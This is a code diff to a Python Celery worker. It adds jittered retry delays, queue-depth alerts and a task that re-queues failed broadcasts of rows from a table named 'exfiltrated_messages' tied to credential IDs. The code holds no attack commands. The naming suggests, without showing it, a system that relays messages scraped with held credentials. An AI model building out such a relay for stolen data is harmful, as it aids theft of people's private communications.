@@ -1,5 +1,6 @@
 import asyncio
 import os
+import random
 import time
 from collections import defaultdict
 from typing import Any, Dict, List
@@ -235,18 +236,30 @@ async def _persist_scrape_classification(cred_id: str, scrape_result: Any) -> No
 
 def _broadcast_retry_delay_seconds(reason: str, retryable: bool, retry_after_seconds: int | None) -> int:
     if retry_after_seconds:
-        return max(60, int(retry_after_seconds) + 30)
+        base_delay = max(60, int(retry_after_seconds) + 30)
+    elif not retryable:
+        base_delay = 24 * 3600
+    elif reason == "timeout":
+        base_delay = 5 * 60
+    elif reason == "network_disconnect":
+        base_delay = 10 * 60
+    elif reason == "topic_missing":
+        base_delay = 60
+    elif reason == "flood_wait":
+        base_delay = 30 * 60
+    else:
+        base_delay = 15 * 60
+
+    max_delay = max(60, int(os.getenv("BROADCAST_RETRY_MAX_DELAY_SECONDS", str(24 * 3600))))
+    delay = min(base_delay, max_delay)
     if not retryable:
-        return 24 * 3600
-    if reason == "timeout":
-        return 5 * 60
-    if reason == "network_disconnect":
-        return 10 * 60
-    if reason == "topic_missing":
-        return 60
-    if reason == "flood_wait":
-        return 30 * 60
-    return 15 * 60
+        return delay
+
+    jitter_ratio = max(0.0, min(float(os.getenv("BROADCAST_RETRY_JITTER_RATIO", "0.20")), 0.50))
+    jitter = int(delay * jitter_ratio)
+    if jitter <= 0:
+        return delay
+    return max(60, delay + random.randint(-jitter, jitter))
 
 
 _BROADCAST_RELIABILITY_COLUMNS_AVAILABLE: bool | None = None
@@ -1174,14 +1187,92 @@ def system_heartbeat():
 def queue_monitor():
     """Return queue depths and oldest tracked job age for operational monitoring."""
     try:
-        from app.core.queue_monitor import get_queue_snapshot
+        from app.core.queue_monitor import get_queue_snapshot, summarize_queue_health
 
         snapshot = get_queue_snapshot(redis_client)
-        logger.info(f"[QueueMonitor] {snapshot}")
-        return snapshot
+        summary = summarize_queue_health(
+            snapshot,
+            length_threshold=settings.QUEUE_ALERT_LENGTH_THRESHOLD,
+            oldest_age_threshold_seconds=settings.QUEUE_ALERT_OLDEST_AGE_SECONDS,
+        )
+        logger.info(f"[QueueMonitor] {summary}")
+        if summary["alerts"]:
+            lines = ["Queue monitor alert:"]
+            for alert in summary["alerts"][:8]:
+                lines.append(
+                    f"- {alert['queue']} {alert['type']}: "
+                    f"{alert['value']} >= {alert['threshold']}"
+                )
+            from app.workers.celery_app import get_worker_loop
+
+            get_worker_loop().run_until_complete(get_broadcaster().send_log("\n".join(lines)))
+        return summary
     except Exception as e:
         logger.warning(f"[QueueMonitor] failed: {e}")
         return {"error": str(e)}
+
+
+@app.task(name="flow.retry_failed_broadcasts")
+def retry_failed_broadcasts(limit: int = 50):
+    """Make failed unbroadcasted messages immediately eligible and trigger broadcast."""
+    from app.workers.celery_app import get_worker_loop
+
+    return get_worker_loop().run_until_complete(_retry_failed_broadcasts_logic(limit))
+
+
+async def _retry_failed_broadcasts_logic(limit: int = 50) -> dict:
+    limit = max(1, min(int(limit or 50), 500))
+    try:
+        response = await async_execute(
+            db.table("exfiltrated_messages")
+            .select("id, credential_id, broadcast_error, broadcast_attempts, next_retry_at")
+            .eq("is_broadcasted", False)
+            .not_.is_("broadcast_error", "null")
+            .order("next_retry_at", desc=False)
+            .limit(limit)
+        )
+        _set_broadcast_reliability_columns_available(True)
+    except Exception as exc:
+        if _is_missing_broadcast_reliability_column(exc):
+            _set_broadcast_reliability_columns_available(False)
+            return {
+                "status": "schema_missing",
+                "reason": "broadcast reliability columns are not available",
+            }
+        raise
+
+    rows = response.data or []
+    if not rows:
+        return {"status": "idle", "updated": 0, "broadcast_dispatched": False}
+
+    updated = 0
+    for row in rows:
+        await async_execute(
+            db.table("exfiltrated_messages")
+            .update({"broadcast_claimed_at": None, "next_retry_at": None})
+            .eq("id", row["id"])
+            .eq("is_broadcasted", False)
+        )
+        updated += 1
+
+    app.send_task("flow.broadcast_pending")
+    AuditLogger.log(
+        AuditEvent.BROADCAST_RETRY_REQUESTED,
+        user="celery_worker",
+        details={
+            "mode": "batch",
+            "updated": updated,
+            "limit": limit,
+            "message_ids": [row.get("id") for row in rows[:20]],
+            "truncated": len(rows) > 20,
+        },
+    )
+    return {
+        "status": "ok",
+        "updated": updated,
+        "broadcast_dispatched": True,
+        "message_ids": [row.get("id") for row in rows],
+    }
 
 
 @app.task(name="flow.canary_flow_check")
